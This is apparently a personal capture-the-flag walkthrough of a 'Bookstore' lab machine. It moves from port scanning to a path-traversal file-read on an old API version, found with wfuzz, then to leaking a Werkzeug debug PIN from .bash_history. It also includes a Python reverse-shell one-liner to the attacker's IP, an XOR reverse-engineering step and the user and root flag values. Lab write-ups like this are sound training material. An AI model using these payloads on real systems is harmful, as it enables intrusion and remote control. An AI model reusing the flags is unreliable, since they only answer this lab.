# Bookstore 

> VOiD | Friday 18 February 2022 04:00:45 AM UTC

My IP : 10.8.253.221
Target IP : 10.10.232.203


## PORT 80 [http - Apache]
```bash

```

## PORT 5000 [http - Werkzeug]
```bash
| http-robots.txt: 1 disallowed entry 
|_/api </p> 

as Werkzeug have /console in it, we will look of it


//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.

API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)


http://10.10.232.203:5000/api/v1/resources/books?page=./../../../../../../../etc/passwd
wfuzz -c -z file,/usr/share/wordlists/directory_enum/directory-list-2.3-medium.txt  -u "http://10.10.232.203:5000/api/v1/resources/books?FUZZ=./../../../../../../../etc/passwd" -v  | tee wfuzz.log

show

sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash

cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=123-321-135
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit

view-source:http://10.10.232.203:5000/api/v1/resources/books?show=.bash_history

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])


```


## USER [sid]
```bash
sid@bookstore:~$ cat user.txt 
4ea65eb80ed441adb68246ddf7b964ab



/try-harder
a = 0x5db3;
check = input ^ 0x1116 ^ a;
if (check == 0x5dcd21f4) {



1573724660 = x ^ 4374 ^ 23987

1573724660 = x^19621

x = 1573724660 ^ 19621
x = 1573743953

sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
1573743953
```

## USER [root]
```bash
root@bookstore:/root# cat root.txt 
e29b05fba5b2a7e69c24a450893158e3

```